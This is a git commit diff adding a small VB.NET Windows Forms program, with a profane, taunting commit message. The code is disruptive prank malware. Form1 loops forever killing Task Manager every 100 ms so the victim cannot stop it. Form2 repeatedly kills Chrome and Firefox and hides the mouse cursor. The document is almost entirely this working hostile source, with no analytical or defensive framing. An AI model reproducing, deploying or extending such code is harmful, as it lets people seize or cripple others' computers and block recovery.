5955fbe45c926137b52dc6fbe1b15d403899c9cf
QwertyFuckingSucksProDvorak <78890852+QwertyFuckingSucksProDvorak@users.noreply.github.com>
2021-02-10 20:57:44 -0600

    The Fucking Project!!!
    fuck you lol

---
+++ Form1.vb
@@ -0,0 +1,18 @@
+﻿Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim T As New Threading.Thread(AddressOf Block)
+        T.Start()
+    End Sub
+    Sub Block()
+        While True
+            For Each P As Process In Process.GetProcessesByName("taskmgr")
+                P.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Form2.Show()
+    End Sub
+End Class
---
+++ Form2.vb
@@ -0,0 +1,31 @@
+﻿Public Class Form2
+    Private Sub Button1_Click(sender As Object, e As EventArgs)
+        Cursor.Show()
+        Application.Exit()
+    End Sub
+
+    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
+        Cursor.Hide()
+    End Sub
+
+    Private Sub PictureBox1_CursorChanged(sender As Object, e As EventArgs) Handles PictureBox1.CursorChanged
+        Cursor.Hide()
+    End Sub
+
+    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim T As New Threading.Thread(AddressOf Block)
+        T.Start()
+    End Sub
+    Sub Block()
+        While True
+            For Each P As Process In Process.GetProcessesByName("chrome")
+                P.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+            For Each F As Process In Process.GetProcessesByName("firefox")
+                F.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+End Class
